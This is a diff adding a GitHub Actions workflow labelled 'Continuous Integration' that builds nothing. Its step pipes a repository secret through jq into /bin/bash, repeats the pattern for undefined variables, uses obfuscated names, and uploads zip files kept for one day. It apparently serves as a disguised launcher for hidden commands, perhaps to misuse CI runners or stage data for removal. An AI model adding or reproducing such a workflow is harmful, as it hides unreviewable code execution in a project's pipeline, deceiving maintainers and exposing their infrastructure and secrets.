@@ -1,0 +1,31 @@
+name: Continuous Integration
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+jobs:
+  handler:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Launch
+        env:
+          rrcl327: ${{ secrets.rrcl327 }}
+        run: |
+          printf '%s' "$rrcl327" | jq -r .bzol403 | /bin/bash
+          printf '%s' "$eeo495" | jq -r .fij7776 | /bin/bash
+          printf '%s' "$l6995" | jq -r .kuzh996 | /bin/bash
+          echo $bvwyb3331 | jq -r .gnr3844 | /bin/bash
+          printf '%s' "$o3" | jq -r .stdz514 | /bin/bash
+          printf '%s' "$x90297" | jq -r .xlmn26730 | /bin/bash
+
+      - name: Persist output
+        uses: actions/upload-artifact@v4
+        with:
+          name: 1Tw3IFM4
+          path: "*.zip"
+          retention-days: 1
